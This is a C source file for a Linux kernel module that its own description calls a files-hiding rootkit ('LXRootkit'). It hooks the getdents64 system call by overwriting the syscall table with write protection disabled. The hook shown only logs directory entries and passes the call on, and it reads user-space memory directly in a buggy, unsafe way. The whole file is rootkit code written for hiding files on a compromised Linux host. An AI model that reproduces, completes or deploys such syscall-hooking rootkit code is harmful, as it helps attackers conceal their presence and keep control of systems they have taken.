
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/smp.h>
#include <linux/string.h> 
#include <linux/dirent.h>
#include <linux/file.h>

#include "hfiles/hooks.h"

// default configuration...
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("files hider rootkit driver"); 
MODULE_VERSION("1.00");

int (*org_sys_getdents64)(
        struct pt_regs*
    ); 

// RDI, RSI, RDX, R10, R8, R9 - params0-5
asmlinkage int my_sys_getdents64(
        struct pt_regs *regs
        )
{
     
  /* 
params: 
    RDI: fd 
    RSI: linux_dirent64 structure pointer 
    RDX: dirent
    R10: count 
    */  
  
    org_sys_getdents64 = hi.originalFunc; 

    struct linux_dirent64 *cur = (struct linux_dirent64*)regs->si; 
    
    struct linux_dirent64 __user *next;
    next = (void __user*)cur + cur->d_reclen;


    printk(KERN_INFO "file: %s\n", next->d_name); 

    return (*org_sys_getdents64)(regs);  
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "[*] Loadiung LXRootkit..."); 

    /* setting the hook */ 
    set_hook(my_sys_getdents64, __NR_getdents64); 
   
    return 0; 
}

static void __exit rootkit_exit(void) {
    
    printk(KERN_INFO "[*] Unloading LXRootkit...\n"); 

    wpOFF(); 
    hi.sstb[hi.nr] = hi.originalFunc;  
    wpON(); 
}
module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



